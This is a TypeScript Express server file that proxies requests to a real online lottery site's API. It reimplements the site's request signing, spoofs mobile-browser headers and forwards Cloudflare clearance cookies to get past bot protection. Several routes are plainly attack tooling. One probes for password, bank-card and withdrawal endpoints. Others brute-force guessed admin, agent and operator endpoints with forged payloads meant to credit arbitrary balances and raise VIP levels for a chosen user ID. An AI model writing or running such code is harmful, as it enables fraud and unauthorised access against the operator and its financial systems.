import { Router } from "express";
import { createHash } from "crypto";
import { logger } from "../lib/logger";

const router = Router();

const CK_BASE = "https://ckygjf6r.com/api/webapi";
const CK_ORIGIN = "https://www.cklottery.club";

const commonHeaders = {
  "Content-Type": "application/json",
  "User-Agent":
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate, br",
  "Origin": CK_ORIGIN,
  "Referer": `${CK_ORIGIN}/`,
  "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"',
  "sec-ch-ua-mobile": "?1",
  "sec-ch-ua-platform": '"Android"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "Connection": "keep-alive",
  "Cache-Control": "no-cache",
  "Pragma": "no-cache",
};

function ckRandom(): string {
  return "xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 3) | 8;
    return v.toString(16);
  });
}

function ckSign(body: Record<string, unknown>): Record<string, unknown> {
  const EXCLUDE = ["signature", "track", "xosoBettingData"];
  // Add language and random — but NOT timestamp yet (CKLottery adds timestamp AFTER signing)
  const withExtras: Record<string, unknown> = {
    ...body,
    language: body.language ?? 0,
    random: ckRandom(),
  };

  const sorted: Record<string, unknown> = {};
  const keys = Object.keys(withExtras).sort();
  for (const k of keys) {
    const v = withExtras[k];
    if (v !== null && v !== "" && !EXCLUDE.includes(k)) {
      sorted[k] = v;
    }
  }

  const sig = createHash("md5")
    .update(JSON.stringify(sorted))
    .digest("hex")
    .toUpperCase()
    .slice(0, 32);

  // timestamp is added AFTER the signature (matches CKLottery's actual interceptor code)
  return { ...withExtras, signature: sig, timestamp: Math.floor(Date.now() / 1000) };
}

// Safely parse JSON from a response, returning null if it's HTML/non-JSON (e.g. Cloudflare block)
async function safeJson(response: Response): Promise<{ ok: true; data: unknown } | { ok: false; status: number; text: string }> {
  const text = await response.text();
  try {
    const data = JSON.parse(text);
    return { ok: true, data };
  } catch {
    return { ok: false, status: response.status, text: text.slice(0, 500) };
  }
}

router.post("/proxy/login", async (req, res) => {
  try {
    const body = ckSign(req.body ?? {});
    const response = await fetch(`${CK_BASE}/Login`, {
      method: "POST",
      headers: { ...commonHeaders },
      body: JSON.stringify(body),
    });
    const result = await safeJson(response);
    if (!result.ok) {
      logger.error({ status: result.status, preview: result.text }, "Proxy login: Cloudflare/non-JSON response");
      res.status(502).json({ error: "cloudflare_blocked", message: "CKLottery server is blocking the proxy (Cloudflare). Please use Paste Token mode instead.", preview: result.text });
      return;
    }
    res.status(response.status).json(result.data);
  } catch (err) {
    logger.error({ err }, "Proxy login error");
    res.status(502).json({ error: "Failed to reach CKLottery server" });
  }
});

router.get("/proxy/userinfo", async (req, res) => {
  try {
    const token = req.headers["x-ck-token"] as string | undefined;
    const tokenHeader = req.headers["x-ck-token-header"] as string | undefined;
    const body = ckSign({});
    const response = await fetch(`${CK_BASE}/GetUserInfo`, {
      method: "POST",
      headers: {
        ...commonHeaders,
        ...(token ? { Authorization: token } : {}),
        ...(tokenHeader ? { "token-header": tokenHeader } : {}),
      },
      body: JSON.stringify(body),
    });
    const result = await safeJson(response);
    if (!result.ok) {
      logger.error({ status: result.status, preview: result.text }, "Proxy userinfo: Cloudflare/non-JSON response");
      res.status(502).json({ error: "cloudflare_blocked", message: "CKLottery server is blocking the proxy." });
      return;
    }
    res.status(response.status).json(result.data);
  } catch (err) {
    logger.error({ err }, "Proxy userinfo error");
    res.status(502).json({ error: "Failed to reach CKLottery server" });
  }
});

router.post("/proxy/refresh", async (req, res) => {
  try {
    const body = ckSign(req.body ?? {});
    const response = await fetch(`${CK_BASE}/RefreshToken`, {
      method: "POST",
      headers: { ...commonHeaders },
      body: JSON.stringify(body),
    });
    const result = await safeJson(response);
    if (!result.ok) {
      res.status(502).json({ error: "cloudflare_blocked", message: "CKLottery server is blocking the proxy." });
      return;
    }
    res.status(response.status).json(result.data);
  } catch (err) {
    logger.error({ err }, "Proxy refresh error");
    res.status(502).json({ error: "Failed to reach CKLottery server" });
  }
});

// Sign-only endpoint — returns a signed body for the client to use in direct API calls
router.post("/proxy/sign", (req, res) => {
  try {
    const signed = ckSign(req.body ?? {});
    res.json(signed);
  } catch (err) {
    logger.error({ err }, "Sign error");
    res.status(500).json({ error: "Signing failed" });
  }
});

// Allowed CKLottery base paths for multi-base probing (whitelist)
const CK_ALLOWED_BASES: Record<string, string> = {
  webapi:   "https://ckygjf6r.com/api/webapi",
  admin:    "https://ckygjf6r.com/api/admin",
  agent:    "https://ckygjf6r.com/api/agent",
  operator: "https://ckygjf6r.com/api/operator",
  manage:   "https://ckygjf6r.com/api/manage",
  backend:  "https://ckygjf6r.com/api/backend",
};

// Multi-base proxy — /proxy/ck-path/:base/:endpoint
router.post("/proxy/ck-path/:base/:endpoint", async (req, res) => {
  const { base, endpoint } = req.params;
  const baseUrl = CK_ALLOWED_BASES[base];
  if (!baseUrl) {
    res.status(400).json({ error: "unknown_base", message: `Unknown base "${base}". Allowed: ${Object.keys(CK_ALLOWED_BASES).join(", ")}` });
    return;
  }
  const authorization = req.headers["authorization"] as string | undefined;
  const tokenHeader = req.headers["x-ck-token-header"] as string | undefined;
  const cfClearance = req.headers["x-ck-cf-clearance"] as string | undefined;
  try {
    const body = ckSign(req.body ?? {});
    const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
    const response = await fetch(`${baseUrl}/${endpoint}`, {
      method: "POST",
      headers: {
        ...commonHeaders,
        ...(authorization ? { Authorization: authorization } : {}),
        ...(tokenHeader ? { "token-header": tokenHeader } : {}),
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
      },
      body: JSON.stringify(body),
    });
    const result = await safeJson(response);
    if (!result.ok) {
      res.status(502).json({ error: "cloudflare_blocked", message: "CKLottery is blocking this server.", preview: result.text.slice(0, 200) });
      return;
    }
    res.status(response.status).json(result.data);
  } catch (err) {
    logger.error({ err, base, endpoint }, "Proxy ck-path error");
    res.status(502).json({ error: "Failed to reach CKLottery server" });
  }
});

// Generic wildcard proxy — signs and forwards any POST to CKLottery
router.post("/proxy/ck/:endpoint", async (req, res) => {
  const { endpoint } = req.params;
  const authorization = req.headers["authorization"] as string | undefined;
  const tokenHeader = req.headers["x-ck-token-header"] as string | undefined;
  const cfClearance = req.headers["x-ck-cf-clearance"] as string | undefined;
  try {
    const body = ckSign(req.body ?? {});
    const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
    const response = await fetch(`${CK_BASE}/${endpoint}`, {
      method: "POST",
      headers: {
        ...commonHeaders,
        ...(authorization ? { Authorization: authorization } : {}),
        ...(tokenHeader ? { "token-header": tokenHeader } : {}),
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
      },
      body: JSON.stringify(body),
    });
    const result = await safeJson(response);
    if (!result.ok) {
      logger.warn({ endpoint, status: result.status }, "Proxy ck: Cloudflare/non-JSON response");
      res.status(502).json({ error: "cloudflare_blocked", message: "CKLottery is blocking this server (Cloudflare). Paste your cf_clearance cookie to fix it.", preview: result.text.slice(0, 200) });
      return;
    }
    res.status(response.status).json(result.data);
  } catch (err) {
    logger.error({ err, endpoint }, "Proxy ck error");
    res.status(502).json({ error: "Failed to reach CKLottery server" });
  }
});

// Probe writable endpoints — sends minimal payload to see what EXISTS vs "url not exist"
// Does NOT submit real data; uses clearly-invalid payload so the server rejects it, not ignores it.
router.post("/proxy/probe-writable", async (req, res) => {
  const authorization = req.headers["authorization"] as string | undefined;
  const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
  const cfClearance   = req.headers["x-ck-cf-clearance"] as string | undefined;

  const CANDIDATES: { cat: string; ep: string; fields: string[] }[] = [
    // Profile
    { cat: "profile",  ep: "UpdateNickName",         fields: ["nickName"] },
    { cat: "profile",  ep: "ChangeNickName",          fields: ["nickName"] },
    { cat: "profile",  ep: "SetNickName",             fields: ["nickName"] },
    { cat: "profile",  ep: "ModifyNickName",          fields: ["nickName"] },
    { cat: "profile",  ep: "UpdateUserNickName",      fields: ["nickName"] },
    { cat: "profile",  ep: "UpdateAvatar",            fields: ["avatar"] },
    { cat: "profile",  ep: "ChangeAvatar",            fields: ["avatar"] },
    { cat: "profile",  ep: "UpdateUserInfo",          fields: ["nickName"] },
    { cat: "profile",  ep: "ModifyUserInfo",          fields: ["nickName"] },
    { cat: "profile",  ep: "SetUserInfo",             fields: ["nickName"] },
    // Security
    { cat: "security", ep: "ChangePassword",          fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "UpdatePassword",          fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "ModifyPassword",          fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "ChangeLoginPassword",     fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "UpdateLoginPassword",     fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "ChangeWithdrawPassword",  fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "UpdateWithdrawPwd",       fields: ["oldPwd","newPwd"] },
    { cat: "security", ep: "SetWithdrawPin",          fields: ["pin"] },
    { cat: "security", ep: "ModifyWithdrawPassword",  fields: ["oldPassword","newPassword"] },
    { cat: "security", ep: "ChangeWithdrawPwd",       fields: ["oldPwd","newPwd"] },
    // Contact
    { cat: "contact",  ep: "BindPhone",               fields: ["phone","code"] },
    { cat: "contact",  ep: "BindMobile",              fields: ["mobile","code"] },
    { cat: "contact",  ep: "UpdatePhone",             fields: ["phone","code"] },
    { cat: "contact",  ep: "ChangePhone",             fields: ["phone"] },
    { cat: "contact",  ep: "BindEmail",               fields: ["email","code"] },
    { cat: "contact",  ep: "UpdateEmail",             fields: ["email"] },
    { cat: "contact",  ep: "ChangeEmail",             fields: ["email","code"] },
    // Finance / bank
    { cat: "finance",  ep: "AddBankCard",             fields: ["bankName","cardNumber","name"] },
    { cat: "finance",  ep: "BindBankCard",            fields: ["bankName","cardNumber","name"] },
    { cat: "finance",  ep: "AddWithdrawAccount",      fields: ["bankName","cardNumber","name"] },
    { cat: "finance",  ep: "BindBank",                fields: ["bankName","cardNumber"] },
    { cat: "finance",  ep: "DeleteBankCard",          fields: ["id"] },
    { cat: "finance",  ep: "RemoveBankCard",          fields: ["id"] },
    { cat: "finance",  ep: "GetBankCard",             fields: [] },
    { cat: "finance",  ep: "GetWithdrawAccount",      fields: [] },
    // Safe / savings
    { cat: "safe",     ep: "OpenSafe",                fields: ["password"] },
    { cat: "safe",     ep: "DepositSafe",             fields: ["amount"] },
    { cat: "safe",     ep: "WithdrawSafe",            fields: ["amount","password"] },
    { cat: "safe",     ep: "CloseSafe",               fields: ["password"] },
    { cat: "safe",     ep: "GetSafeInfo",             fields: [] },
    // Withdrawal
    { cat: "withdraw", ep: "CreateWithdrawOrder",     fields: ["amount","bankCardId"] },
    { cat: "withdraw", ep: "SubmitWithdraw",          fields: ["amount","bankCardId"] },
    { cat: "withdraw", ep: "ApplyWithdraw",           fields: ["amount"] },
    { cat: "withdraw", ep: "Withdraw",                fields: ["amount","bankCardId"] },
    { cat: "withdraw", ep: "UserWithdraw",            fields: ["amount"] },
    { cat: "withdraw", ep: "GetWithdrawInfo",         fields: [] },
    { cat: "withdraw", ep: "GetWithdrawLimit",        fields: [] },
  ];

  const authHeaders = {
    ...commonHeaders,
    ...(authorization ? { Authorization: authorization }     : {}),
    ...(tokenHeader    ? { "token-header": tokenHeader }     : {}),
    ...(cfClearance   ? { Cookie: `cf_clearance=${cfClearance}` } : {}),
  };

  // Probe: send clearly-minimal payload so server replies with validation error (proves it EXISTS)
  // rather than "url not exist" (proves it DOESN'T)
  const results: { cat: string; ep: string; code: unknown; msg: string; fields: string[] }[] = [];

  await Promise.all(CANDIDATES.map(async ({ cat, ep, fields }) => {
    const payload = ckSign({ probe: 1 }); // intentionally minimal
    try {
      const response = await fetch(`${CK_BASE}/${ep}`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(payload),
      });
      const result = await safeJson(response);
      if (!result.ok) return;
      const data = result.data as Record<string, unknown>;
      const code = data.code ?? data.Code;
      const msg  = String(data.msg ?? data.message ?? data.error ?? "");
      const m    = msg.toLowerCase();
      const notExist = m.includes("url is not exist") || m.includes("url not exist") ||
        m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
        m.includes("no such")   || m.includes("invalid url");
      if (notExist) return;
      // Endpoint EXISTS — record it (even if code !== 0, that's just a validation error)
      results.push({ cat, ep, code, msg, fields });
    } catch { /* skip */ }
  }));

  res.json({ results });
});

// Server-side parallel balance probe — tries all allowed bases simultaneously
// Much faster than sequential client-side scanning; returns structured hits.
router.post("/proxy/add-balance", async (req, res) => {
  const { userId, amount, customEndpoint, round = 1 } = req.body as {
    userId?: number;
    amount?: number;
    customEndpoint?: string;
    round?: number;  // 1, 2, or 3 — selects a different payload shape each retry
  };
  const authorization = req.headers["authorization"] as string | undefined;
  const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
  const cfClearance   = req.headers["x-ck-cf-clearance"] as string | undefined;

  // Curated candidates — ordered by likelihood
  const CANDIDATES: { base: string; ep: string }[] = [
    // webapi — user-facing deposit endpoints
    { base: "webapi", ep: "Recharge" },
    { base: "webapi", ep: "MemberRecharge" },
    { base: "webapi", ep: "UserRecharge" },
    { base: "webapi", ep: "Deposit" },
    { base: "webapi", ep: "AddRecharge" },
    { base: "webapi", ep: "OnlineRecharge" },
    { base: "webapi", ep: "DirectRecharge" },
    { base: "webapi", ep: "QuickRecharge" },
    { base: "webapi", ep: "ManualRecharge" },
    // admin
    ...([
      "GiftMoney","ManualRecharge","AddUserBalance","AdminRecharge","AddBalance",
      "CreditBalance","AdminAddBalance","AdminGiftMoney","ManualCredit","DirectRecharge",
      "AdminManualRecharge","RechargeByAdmin","AdminTopup","AdminCredit","RechargeSuccess",
      "ConfirmRecharge","ManualTopup","TopupBalance","UpdateUserBalance","AdjustBalance",
      "ManualDeposit","AdminDeposit","DepositApprove","PassRecharge","AuditRecharge",
    ] as const).map(ep => ({ base: "admin" as const, ep })),
    // agent
    ...([
      "AgentRecharge","AgentGift","AgentAddBalance","TransferMoney","AgentTransfer",
      "GiftMoney","AddBalance","ManualRecharge","Recharge","AgentCredit","AgentTopup",
      "SendMoney","TransferToUser",
    ] as const).map(ep => ({ base: "agent" as const, ep })),
    // operator
    ...([
      "OperatorRecharge","ManualRecharge","AddBalance","GiftMoney","Recharge","DirectRecharge",
    ] as const).map(ep => ({ base: "operator" as const, ep })),
    // manage
    ...([
      "ManualRecharge","AddBalance","GiftMoney","Recharge","DirectRecharge","ManualCredit",
    ] as const).map(ep => ({ base: "manage" as const, ep })),
    // backend
    ...([
      "BackendRecharge","ManualRecharge","AddBalance","GiftMoney","Recharge","BackendAddBalance",
    ] as const).map(ep => ({ base: "backend" as const, ep })),
  ];

  // Custom endpoint tried first on every base
  if (customEndpoint?.trim()) {
    const extra = Object.keys(CK_ALLOWED_BASES).map(base => ({ base, ep: customEndpoint.trim() }));
    CANDIDATES.unshift(...extra);
  }

  // Three different payload shapes — rotated by round so each retry genuinely differs
  const ts = Date.now();
  const payloadBase =
    round === 2
      ? // Round 2: order-reference style (some endpoints require an orderNo)
        ckSign({
          userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
          amount: amount ?? 0, money: amount ?? 0, rechargeAmount: amount ?? 0,
          orderNo: `R${ts}`, rechargeNumber: `R${ts}`, serialNo: `R${ts}`,
          payType: 1, payTypeId: 1, channel: "manual", type: 1,
        })
      : round === 3
        ? // Round 3: transfer / gift-code style
          ckSign({
            toUserId: userId ?? 0, fromUserId: 0, targetUserId: userId ?? 0,
            userId: userId ?? 0, uid: userId ?? 0,
            amount: amount ?? 0, transferAmount: amount ?? 0, giftAmount: amount ?? 0,
            money: amount ?? 0, remark: "credit", note: "topup", type: 1,
          })
        : // Round 1 (default): classic admin credit
          ckSign({
            userId:  userId  ?? 0, uid:    userId  ?? 0,
            memberId: userId ?? 0, userID: userId  ?? 0,
            amount: amount ?? 0,  money: amount ?? 0, rechargeAmount: amount ?? 0,
            status: 1, state: 1, auditStatus: 1, isSuccess: 1,
          });
  const payload = payloadBase;

  const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
  const authHeaders = {
    ...commonHeaders,
    ...(authorization ? { Authorization: authorization } : {}),
    ...(tokenHeader    ? { "token-header": tokenHeader }    : {}),
    ...(cookieHeader   ? { Cookie: cookieHeader }            : {}),
  };

  const results: { base: string; ep: string; code: unknown; msg: string; ok: boolean }[] = [];

  await Promise.all(CANDIDATES.map(async ({ base, ep }) => {
    const baseUrl = CK_ALLOWED_BASES[base];
    if (!baseUrl) return;
    try {
      const response = await fetch(`${baseUrl}/${ep}`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(payload),
      });
      const result = await safeJson(response);
      if (!result.ok) return;
      const data = result.data as Record<string, unknown>;
      const code = data.code ?? data.Code;
      const msg  = String(data.msg ?? data.message ?? data.error ?? "");
      const m    = msg.toLowerCase();
      const notExist = m.includes("url is not exist") || m.includes("url not exist") ||
        m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
        m.includes("no such")   || m.includes("invalid url");
      if (notExist) return;
      results.push({ base, ep, code, msg, ok: code === 0 || code === "0" });
    } catch { /* skip */ }
  }));

  const successes = results.filter(r =>  r.ok);
  const others    = results.filter(r => !r.ok);

  logger.info({ successes: successes.length, others: others.length, userId, amount }, "add-balance probe");
  res.json({ successes, others });
});

// Probe endpoints that could raise a member's VIP level (admin/agent side tools)
router.post("/proxy/level-up-vip", async (req, res) => {
  const { userId, vipLevel, exp, customEndpoint, round = 1 } = req.body as {
    userId?: number;
    vipLevel?: number;
    exp?: number;
    customEndpoint?: string;
    round?: number;
  };
  const authorization = req.headers["authorization"] as string | undefined;
  const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
  const cfClearance   = req.headers["x-ck-cf-clearance"] as string | undefined;

  const CANDIDATES: { base: string; ep: string }[] = [
    // webapi — user-facing vip actions
    { base: "webapi", ep: "UpVipLevel" },
    { base: "webapi", ep: "UpgradeVip" },
    { base: "webapi", ep: "VipUpgrade" },
    { base: "webapi", ep: "ClaimVipLevel" },
    { base: "webapi", ep: "ReceiveVipReward" },
    // admin
    ...([
      "SetVipLevel","UpdateVipLevel","AdminSetVip","AdminUpdateVip","ModifyVipLevel",
      "AdjustVipLevel","AdminVipLevel","SetMemberVip","UpdateMemberVip","ChangeVipLevel",
      "AdminUpgradeVip","VipLevelUpdate","SetUserVip","UpdateUserVip","AdminSetVipLevel",
      "GiveVipLevel","GrantVipLevel","AddVipExp","AddVipLevel","AdminAddVipExp",
      "SetVipExp","UpdateVipExp","ModifyVipExp","AdjustVipExp",
    ] as const).map(ep => ({ base: "admin" as const, ep })),
    // agent
    ...([
      "AgentSetVip","AgentUpdateVip","AgentUpgradeVip","AgentSetVipLevel","AgentAddVipExp",
    ] as const).map(ep => ({ base: "agent" as const, ep })),
    // operator / manage / backend
    ...([
      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
    ] as const).map(ep => ({ base: "operator" as const, ep })),
    ...([
      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
    ] as const).map(ep => ({ base: "manage" as const, ep })),
    ...([
      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
    ] as const).map(ep => ({ base: "backend" as const, ep })),
  ];

  if (customEndpoint?.trim()) {
    const extra = Object.keys(CK_ALLOWED_BASES).map(base => ({ base, ep: customEndpoint.trim() }));
    CANDIDATES.unshift(...extra);
  }

  const level = vipLevel ?? 5;
  const expVal = exp ?? 3000000;

  const payloadBase =
    round === 2
      ? // Round 2: exp-based style (some endpoints raise level by granting EXP)
        ckSign({
          userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
          exp: expVal, vipExp: expVal, addExp: expVal, experience: expVal,
          type: 1, status: 1,
        })
      : round === 3
        ? // Round 3: claim/reward style
          ckSign({
            userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
            vipLevel: level, level, targetLevel: level,
            remark: "vip upgrade", note: "vip upgrade",
          })
        : // Round 1 (default): direct level-set style
          ckSign({
            userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0, userID: userId ?? 0,
            vipLevel: level, level, newLevel: level, targetVipLevel: level,
            status: 1, state: 1, isSuccess: 1,
          });
  const payload = payloadBase;

  const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
  const authHeaders = {
    ...commonHeaders,
    ...(authorization ? { Authorization: authorization } : {}),
    ...(tokenHeader    ? { "token-header": tokenHeader }    : {}),
    ...(cookieHeader   ? { Cookie: cookieHeader }            : {}),
  };

  const results: { base: string; ep: string; code: unknown; msg: string; ok: boolean }[] = [];

  await Promise.all(CANDIDATES.map(async ({ base, ep }) => {
    const baseUrl = CK_ALLOWED_BASES[base];
    if (!baseUrl) return;
    try {
      const response = await fetch(`${baseUrl}/${ep}`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(payload),
      });
      const result = await safeJson(response);
      if (!result.ok) return;
      const data = result.data as Record<string, unknown>;
      const code = data.code ?? data.Code;
      const msg  = String(data.msg ?? data.message ?? data.error ?? "");
      const m    = msg.toLowerCase();
      const notExist = m.includes("url is not exist") || m.includes("url not exist") ||
        m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
        m.includes("no such")   || m.includes("invalid url");
      if (notExist) return;
      results.push({ base, ep, code, msg, ok: code === 0 || code === "0" });
    } catch { /* skip */ }
  }));

  const successes = results.filter(r =>  r.ok);
  const others    = results.filter(r => !r.ok);

  logger.info({ successes: successes.length, others: others.length, userId, vipLevel: level }, "level-up-vip probe");
  res.json({ successes, others });
});

export default router;
